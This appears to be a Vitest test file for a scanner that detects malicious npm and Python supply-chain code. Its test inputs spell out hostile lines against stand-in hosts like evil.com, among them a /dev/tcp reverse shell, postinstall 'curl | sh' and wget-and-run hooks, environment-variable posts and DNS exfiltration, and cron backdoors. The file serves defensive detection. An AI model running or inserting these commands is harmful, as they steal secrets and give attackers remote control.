import { describe, it, expect } from 'vitest';
import { supplyChainChecks } from '../../src/checks/supply-chain/index.js';
import { testLine, testFileCheck } from '../helpers.js';

// ---------------------------------------------------------------------------
// SC001 - Bulk Environment Variable Access with Network Call (FileCheck)
// ---------------------------------------------------------------------------

describe('SC001 - Bulk Environment Variable Access with Network Call', () => {
  it('detects Object.keys(process.env) with fetch in same file', async () => {
    const content = [
      'const envVars = Object.keys(process.env);',
      'fetch("https://evil.com", { body: JSON.stringify(envVars) });',
    ].join('\n');
    const findings = await testFileCheck(supplyChainChecks, 'SC001', content, {
      relativePath: 'node_modules/evil-pkg/index.js',
      extension: 'js',
      basename: 'index.js',
    });
    expect(findings.length).toBe(1);
    expect(findings[0].checkId).toBe('SC001');
    expect(findings[0].severity).toBe('critical');
    expect(findings[0].category).toBe('supply-chain');
  });

  it('detects Object.entries(process.env) with axios', async () => {
    const content = [
      'const envVars = Object.entries(process.env);',
      'axios.post("https://evil.com", envVars);',
    ].join('\n');
    const findings = await testFileCheck(supplyChainChecks, 'SC001', content, {
      relativePath: 'node_modules/evil-pkg/exfil.js',
      extension: 'js',
      basename: 'exfil.js',
    });
    expect(findings.length).toBe(1);
  });

  it('does not flag bulk env without network call', async () => {
    const content = 'const envVars = Object.keys(process.env);\nconsole.log(envVars);';
    const findings = await testFileCheck(supplyChainChecks, 'SC001', content, {
      relativePath: 'node_modules/some-pkg/index.js',
      extension: 'js',
      basename: 'index.js',
    });
    expect(findings).toHaveLength(0);
  });

  it('does not flag single process.env.NODE_ENV access', async () => {
    const content = 'const env = process.env.NODE_ENV;\nfetch("https://api.com");';
    const findings = await testFileCheck(supplyChainChecks, 'SC001', content, {
      relativePath: 'node_modules/some-pkg/index.js',
      extension: 'js',
      basename: 'index.js',
    });
    expect(findings).toHaveLength(0);
  });

  it('does not flag minified bundles', async () => {
    // Minified: >2000 char line — many modules bundled together
    const longLine = 'var a=' + 'Object.keys(process.env)'.padEnd(500, ';var b=1') +
      ';fetch("https://api.com")' + ';var c=2'.repeat(200);
    const findings = await testFileCheck(supplyChainChecks, 'SC001', longLine, {
      relativePath: 'node_modules/some-pkg/dist/bundle.js',
      extension: 'js',
      basename: 'bundle.js',
    });
    expect(findings).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// SC002 - HTTP Exfiltration of Secrets
// ---------------------------------------------------------------------------

describe('SC002 - HTTP POST with Secrets', () => {
  it('detects .post() with process.env', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC002',
      'axios.post(url, { data: process.env })',
    );
    expect(finding).not.toBeNull();
    expect(finding!.checkId).toBe('SC002');
    expect(finding!.severity).toBe('critical');
    expect(finding!.category).toBe('supply-chain');
  });

  it('detects http.request with credential', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC002',
      'http.request(url, { body: credential })',
    );
    expect(finding).not.toBeNull();
  });

  it('detects requests.post with os.environ in Python', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC002',
      'requests.post(url, data=os.environ)',
      'py',
    );
    expect(finding).not.toBeNull();
  });

  it('does not flag .get() calls', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC002',
      'axios.get(url + process.env.API_URL)',
    );
    expect(finding).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// SC003 - eval/exec of Fetched Content
// ---------------------------------------------------------------------------

describe('SC003 - Remote Code Execution via Fetch', () => {
  it('detects eval of fetched content', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC003',
      "eval(await fetch('http://evil.com').text())",
    );
    expect(finding).not.toBeNull();
    expect(finding!.checkId).toBe('SC003');
    expect(finding!.severity).toBe('critical');
  });

  it('detects exec with axios', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC003',
      'exec(await axios.get(url))',
    );
    expect(finding).not.toBeNull();
  });

  it('does not flag regular eval', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC003',
      'eval(someLocalVar)',
    );
    expect(finding).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// SC004 - Base64 Decoded Execution
// ---------------------------------------------------------------------------

describe('SC004 - Base64 Decoded Execution', () => {
  it('detects eval of atob result', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC004',
      "eval(atob('aGVsbG8gd29ybGQ='))",
    );
    expect(finding).not.toBeNull();
    expect(finding!.checkId).toBe('SC004');
    expect(finding!.severity).toBe('critical');
  });

  it('detects eval of Buffer.from base64', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC004',
      "eval(Buffer.from('aGVsbG8=', 'base64'))",
    );
    expect(finding).not.toBeNull();
  });

  it('detects exec of b64decode in Python', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC004',
      "exec(base64.b64decode(encoded))",
      'py',
    );
    expect(finding).not.toBeNull();
  });
});

// ---------------------------------------------------------------------------
// SC005 - Obfuscated Code
// ---------------------------------------------------------------------------

describe('SC005 - Obfuscated Code', () => {
  it('detects 21+ hex escape sequences', () => {
    // 22 hex pairs mixed with real code — not a pure data table
    const hexPairs = Array.from({ length: 22 }, (_, i) => `\\x${(0x41 + (i % 26)).toString(16)}`).join('');
    const finding = testLine(
      supplyChainChecks,
      'SC005',
      `var payload = "${hexPairs}"; sendData(payload); doOtherStuff(); morePaddingHere();`,
    );
    expect(finding).not.toBeNull();
    expect(finding!.checkId).toBe('SC005');
    expect(finding!.severity).toBe('high');
  });

  it('does not flag 15 hex pairs (below threshold)', () => {
    const hexPairs = Array.from({ length: 15 }, (_, i) => `\\x${(0x41 + (i % 26)).toString(16)}`).join('');
    const finding = testLine(
      supplyChainChecks,
      'SC005',
      `var a = "${hexPairs}"`,
    );
    expect(finding).toBeNull();
  });

  it('does not flag short hex sequences', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC005',
      'var a = "\\x68\\x65"',
    );
    expect(finding).toBeNull();
  });

  it('does not flag data-heavy lines (unicode tables)', () => {
    // Pure hex data — >80% hex content indicates a lookup table, not obfuscation
    const hexPairs = Array.from({ length: 25 }, (_, i) => `\\x${(0x41 + (i % 26)).toString(16)}`).join('');
    const finding = testLine(
      supplyChainChecks,
      'SC005',
      `"${hexPairs}"`,
      'js',
    );
    expect(finding).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// SC006 - Reverse Shell Pattern
// ---------------------------------------------------------------------------

describe('SC006 - Reverse Shell Pattern', () => {
  it('detects /bin/bash with socket', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC006',
      'child_process.exec("/bin/bash -i >& /dev/tcp/evil.com/4444 0>&1", { socket: true })',
    );
    expect(finding).not.toBeNull();
    expect(finding!.checkId).toBe('SC006');
    expect(finding!.severity).toBe('critical');
  });

  it('detects /bin/sh with net.connect', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC006',
      'spawn("/bin/sh", ["-c", "nc"], { stdio: [net.connect(4444, "evil.com")] })',
    );
    expect(finding).not.toBeNull();
  });

  it('does not flag shell without network socket', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC006',
      'child_process.exec("/bin/bash ./build.sh")',
    );
    expect(finding).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// SC007 - Cryptocurrency Mining
// ---------------------------------------------------------------------------

describe('SC007 - Cryptocurrency Mining', () => {
  it('detects coinhive reference', () => {
    const finding = testLine(supplyChainChecks, 'SC007', 'new CoinHive.Anonymous("sitekey")');
    expect(finding).not.toBeNull();
    expect(finding!.checkId).toBe('SC007');
    expect(finding!.severity).toBe('high');
  });

  it('detects stratum+tcp mining pool', () => {
    const finding = testLine(supplyChainChecks, 'SC007', 'connect("stratum+tcp://pool.minexmr.com:4444")');
    expect(finding).not.toBeNull();
  });

  it('detects xmrig reference', () => {
    const finding = testLine(supplyChainChecks, 'SC007', 'const miner = require("xmrig")');
    expect(finding).not.toBeNull();
  });
});

// ---------------------------------------------------------------------------
// SC008 - Postinstall Network Fetch
// ---------------------------------------------------------------------------

describe('SC008 - Install Script Network Fetch', () => {
  it('flags postinstall curl', async () => {
    const content = JSON.stringify({
      name: 'evil-package',
      version: '1.0.0',
      scripts: {
        postinstall: 'curl http://evil.com/payload.sh | sh',
      },
    }, null, 2);
    const findings = await testFileCheck(supplyChainChecks, 'SC008', content, {
      relativePath: 'node_modules/evil-package/package.json',
      extension: 'json',
      basename: 'package.json',
    });
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0].checkId).toBe('SC008');
    expect(findings[0].severity).toBe('critical');
    expect(findings[0].category).toBe('supply-chain');
    expect(findings[0].message).toContain('postinstall');
  });

  it('flags preinstall with wget', async () => {
    const content = JSON.stringify({
      name: 'bad-pkg',
      scripts: {
        preinstall: 'wget http://evil.com/malware -O /tmp/a && bash /tmp/a',
      },
    }, null, 2);
    const findings = await testFileCheck(supplyChainChecks, 'SC008', content, {
      relativePath: 'node_modules/bad-pkg/package.json',
      extension: 'json',
      basename: 'package.json',
    });
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0].message).toContain('preinstall');
  });

  it('flags install with node -e', async () => {
    const content = JSON.stringify({
      name: 'sneaky',
      scripts: {
        install: 'node -e "require(\'child_process\').exec(\'curl http://evil.com\')"',
      },
    }, null, 2);
    const findings = await testFileCheck(supplyChainChecks, 'SC008', content, {
      relativePath: 'node_modules/sneaky/package.json',
      extension: 'json',
      basename: 'package.json',
    });
    expect(findings.length).toBeGreaterThan(0);
  });

  it('does not flag safe postinstall', async () => {
    const content = JSON.stringify({
      name: 'safe-package',
      scripts: {
        postinstall: 'node scripts/build.js',
      },
    }, null, 2);
    const findings = await testFileCheck(supplyChainChecks, 'SC008', content, {
      relativePath: 'node_modules/safe-package/package.json',
      extension: 'json',
      basename: 'package.json',
    });
    expect(findings).toHaveLength(0);
  });

  it('does not flag non-package.json files', async () => {
    const content = JSON.stringify({
      scripts: {
        postinstall: 'curl http://evil.com | sh',
      },
    }, null, 2);
    const findings = await testFileCheck(supplyChainChecks, 'SC008', content, {
      relativePath: 'config.json',
      extension: 'json',
      basename: 'config.json',
    });
    expect(findings).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// SC009 - DNS Exfiltration
// ---------------------------------------------------------------------------

describe('SC009 - DNS Exfiltration', () => {
  it('detects dns.resolve with process.env data', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC009',
      'dns.resolve(`${process.env.SECRET}.evil.com`, callback)',
    );
    expect(finding).not.toBeNull();
    expect(finding!.checkId).toBe('SC009');
    expect(finding!.severity).toBe('high');
  });

  it('detects dns.lookup with token', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC009',
      'dns.lookup(`${token}.exfil.attacker.com`)',
    );
    expect(finding).not.toBeNull();
  });

  it('detects dns.resolve with password', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC009',
      'dns.resolve(`${password}.evil.com`)',
    );
    expect(finding).not.toBeNull();
  });
});

// ---------------------------------------------------------------------------
// SC010 - Systemd/Cron Persistence
// ---------------------------------------------------------------------------

describe('SC010 - System Persistence Mechanism', () => {
  it('detects writeFileSync to /etc/systemd', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC010',
      'fs.writeFileSync("/etc/systemd/system/backdoor.service", serviceFile)',
    );
    expect(finding).not.toBeNull();
    expect(finding!.checkId).toBe('SC010');
    expect(finding!.severity).toBe('critical');
    expect(finding!.category).toBe('supply-chain');
  });

  it('detects writeFile to /etc/cron', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC010',
      'writeFile("/etc/cron.d/backdoor", "* * * * * /tmp/evil")',
    );
    expect(finding).not.toBeNull();
  });

  it('detects open() with crontab - in Python', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC010',
      'open("/etc/cron.d/miner", "w").write(crontab -payload)',
      'py',
    );
    expect(finding).not.toBeNull();
  });

  it('does not flag .service without writeFile context', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC010',
      'const svc = new Service({ name: "myapp.service" })',
    );
    expect(finding).toBeNull();
  });

  it('does not flag commented-out systemd reference', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC010',
      '// writeFileSync to /etc/systemd is not recommended',
    );
    expect(finding).toBeNull();
  });
});
